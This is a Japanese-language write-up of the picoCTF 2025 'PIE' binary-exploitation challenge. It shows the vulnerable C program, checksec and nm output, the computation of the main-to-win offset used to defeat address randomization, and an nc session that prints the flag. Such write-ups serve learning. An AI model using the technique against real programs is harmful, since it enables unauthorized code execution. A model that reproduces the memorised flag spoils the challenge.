#Easy #Binary_Exploitation #picoCTF_2025 #browser_webshell_solvable

# Overview
![[Pasted image 20250528091452.png]]

# Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```
mainアドレスが出力されて、入力したアドレスが実行される感じのプログラムですね。
パッと見でwin()のアドレスを入力すればよさそうです。

# How to Capture the flag
プログラムの実行ファイルが添付されているので解析してみましょう👀
```sh
root@idea:~/CLionProjects/ctf# file vuln
vuln: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0072413e1b5a0613219f45518ded05fc685b680a, for GNU/Linux 3.2.0, not stripped
```
```sh
root@idea:~/CLionProjects/ctf# checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified Fortifiable     FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   78 Symbols        No    01vuln

```
タイトル通りPIEが有効になっているようです。
低レイヤーの知見がなかったので調べることに🔍
> PIE(Position Independent Executable)はプログラムをロードするアドレスが固定ではない実行ファイルです。OSはロードアドレスをランダム化することで安全性を上げることができます。
> https://zenn.dev/tetsu_koba/articles/ecde4c6b5073bd

らしい🤨

どうやらかなり脆弱な機能ですが理解できました。
main()のアドレスが出力されていたのでwin()との差分を計算して入力すればいけそう。

```sh
root@idea:~/CLionProjects/ctf# nm vuln | grep main
                 U __libc_start_main@@GLIBC_2.2.5
000000000000133d T main

root@idea:~/CLionProjects/ctf# nm vuln | grep win
00000000000012a7 T win
```
`0x133D - 0x12A7 = 0x96` なので、main関数のアドレスが表示されたら、0x96 を引いたアドレスを指定すれば良さそうです。

```sh
root@idea:~/CLionProjects/ctf# nc rescued-float.picoctf.net 50268
Address of main: 0x64dba51c733d
Enter the address to jump to, ex => 0x12345: 0x64DBA51C72A7                                  
Your input: 64dba51c72a7
You won!
picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_378c1259}
```
Gotcha!
フラグを掴むことができました🚩